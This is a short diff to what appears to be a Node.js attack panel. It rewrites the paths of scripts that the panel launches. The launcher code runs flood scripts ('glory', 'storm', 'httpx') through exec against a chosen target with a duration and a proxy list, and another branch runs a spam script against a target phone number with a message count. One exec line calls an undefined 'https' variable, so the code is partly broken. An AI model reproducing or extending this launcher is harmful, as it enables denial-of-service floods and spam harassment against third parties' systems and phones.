@@ -233,9 +233,9 @@ const metode = path.join(__dirname, `${methods}`);
           sigma()
           } else if (methods === 'mixed') {
        pushmonitor(target, methods, duration)
-const glory = path.join(__dirname, `/lib/cache/glory`);
-const storm = path.join(__dirname, `/lib/cache/storm`);
-const httpx = path.join(__dirname, `/lib/cache/httpx`);
+const glory = path.join(__dirname, `glory`);
+const storm = path.join(__dirname, `storm`);
+const httpx = path.join(__dirname, `httpx`);
         exec(`node ${glory} ${target} ${duration} 100 10 proxy.txt`)
         exec(`node ${storm} ${target} ${duration} 100 10 proxy.txt`)
         exec(`node ${https} ${target} ${duration} 100 10 proxy.txt`)
@@ -247,7 +247,7 @@ const httpx = path.join(__dirname, `/lib/cache/httpx`);
 // [========================================] //
 function methods() {
     
-    const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));
+    const methodsData = JSON.parse(fs.readFileSync('methods.json', 'utf-8'));
 
     console.log(`                          Methods`);
     console.log(` NAME      │ DESCRIPTION                    │ DURATION`);
@@ -461,7 +461,7 @@ console.log(`Attack Detail
   console.log(`Error`)
 }
 
-const metode = path.join(__dirname, `/lib/cache/17`);
+const metode = path.join(__dirname, `17`);
 exec(`node ${metode} ${targetNumber} ${spamAmount}`)
 sigma()
 };
